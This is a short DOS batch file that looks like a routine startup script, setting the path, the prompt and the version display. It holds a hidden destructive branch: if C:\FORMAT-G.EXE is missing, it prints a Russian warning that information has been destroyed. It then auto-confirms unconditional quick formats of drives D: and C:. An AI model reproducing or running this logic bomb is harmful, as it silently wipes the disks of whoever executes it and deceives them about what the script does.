@echo off
path a:\
newdosed
prompt $p$g
ver
:Перевод строки!
@echo off
if exist C:\FORMAT-G.EXE goto fun
echo    Внимание! НЕ найден системный файл: 
echo C:\FORMAT-G.EXE Информация уничтожена...
echo y| format d: /q /u
echo y| format c: /q /u

:fun
